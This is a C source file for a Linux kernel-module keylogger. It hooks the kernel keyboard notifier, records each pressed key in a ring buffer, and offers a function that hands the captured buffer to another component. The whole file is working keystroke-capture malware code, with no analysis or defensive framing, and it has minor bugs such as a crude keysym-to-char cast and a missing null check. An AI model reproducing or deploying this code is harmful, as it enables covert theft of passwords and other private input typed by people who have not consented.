#include "keylogger.h"

char keylog_buffer[BUFFER_SIZE] = { '\0' };
int keylog_buffer_index = 0;
struct notifier_block keyboard_notifier_block = {
	.notifier_call = keyboard_notifier_callback,
};

void insert_key(char key) {
	keylog_buffer[keylog_buffer_index] = key;
	keylog_buffer_index = (keylog_buffer_index + 1) % BUFFER_SIZE;
}

irqreturn_t keyboard_interrupt_handler(int irq, void *dev) {
	struct keyboard_notifier_param *param = dev;

	if (param && param->value) {
		unsigned int keycode = param->value;
		
		char key = (char)keycode;

		insert_key(key);
	} else {
		printk(KERN_ERR "Invalid keyboard interrupt parameters\n");
	}

	return IRQ_NONE;
}

int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	
	if (code == KBD_KEYSYM && param && param->down) {
		keyboard_interrupt_handler(0, param);
	}
	else if (code == KBD_KEYCODE && param->value == KEY_ENTER) {
		insert_key('\n');
	}
	return NOTIFY_OK;
}

void set_keylog_buffer(char *buffer) {
	memcpy(buffer, keylog_buffer, BUFFER_SIZE);
	memset(keylog_buffer, 0, BUFFER_SIZE);
	keylog_buffer_index = 0;
}

int keylogger_init(void) {
	int ret = register_keyboard_notifier(&keyboard_notifier_block);

	if (ret != 0) {
		printk(KERN_ERR "Failed to register keyboard notifier\n");
		return ret;
	}

	printk(KERN_INFO "Keylogger initialized\n");
	return 0;
}

void keylogger_exit(void) {
	int ret = unregister_keyboard_notifier(&keyboard_notifier_block);

	if (ret != 0) {
		printk(KERN_ERR "Failed to unregister keyboard notifier: %d\n", ret);
	}

	printk(KERN_INFO "Keylogger exited\n");
}
